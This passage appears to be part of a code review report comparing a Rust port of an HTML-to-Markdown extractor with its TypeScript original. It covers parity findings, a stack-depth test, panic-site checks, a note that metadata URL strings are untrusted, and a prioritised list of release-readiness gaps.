  - `<` is escaped unless the text is a complete http(s) or email autolink.
- **Fixture-specific runtime code.** Every heuristic string I checked also exists upstream, including
  verso, elementor, ftnt, easy-footnote, hurmet, temml, ltx_, and the social and domain strings.
- **Reviewed differences.** I spot-checked four: Daring Fireball, 12 Grams, LessWrong, and Word
  footnotes. Each diff matches its stated reason.
- **Non-math prose loss.** None across 208 cases (Q5).
- **Normal-HTML Markdown differential.** I compared 37 ordinary features against TypeScript. Rust is
  equal or better everywhere except Q8. Rust improvements include task-list state, table alignment,
  nested list depth, loose-list paragraphs, inline code without injected emphasis, and preserved
  blank lines in `<pre>`.
- **Stack depth.** No overflow at nesting 2,000 under a 2 MiB stack (the spawned-thread default) in the
  debug build. Time is super-linear in both implementations: Rust debug 2.5 s → 55 s and TypeScript
  0.6 s → 7 s from nesting 500 to 2,000 (cross-ref H1).
- **Panics in my scope.** The `unwrap` and `expect` sites in `markdown.rs`, `footnotes.rs`,
  `standardize.rs`, `video.rs`, and `embedded.rs` are guarded by preceding checks or selectors.
  Architecture D2 covers `metadata.rs:698/701`.

**Parity items to document, not defects:**

- Metadata `image`/`favicon` are raw page strings: `javascript:` and `data:text/html` pass through, as
  in TypeScript. State that metadata strings are untrusted.
- `IncludeReplies::All` behaves like `Extractors`, as in TypeScript.
- Adapter dispatch uses `host.contains`, as TypeScript's `domain.includes` does.

## Release-readiness gaps

1. **Must fix with fixtures:** Q1, Q2, Q3/D1, Q4, and architecture D2.
2. **Before relying on the quality claim:** add the Q5 prose gate and replace the boilerplate math
   reasons with case-specific claims.
3. **Hardening:** Q7 (`meta`/`link` unconditional), Q6 (tight dollars), and Q8.
4. **API:** add `#[non_exhaustive]` to `WarningCode` and `Error`. Narrow the hidden public modules
   (architecture S2). Document the Q10 behavior and the trust model for metadata strings.
5. **Benchmark reporting:** report the per-case median speedup alongside the aggregate (M1).
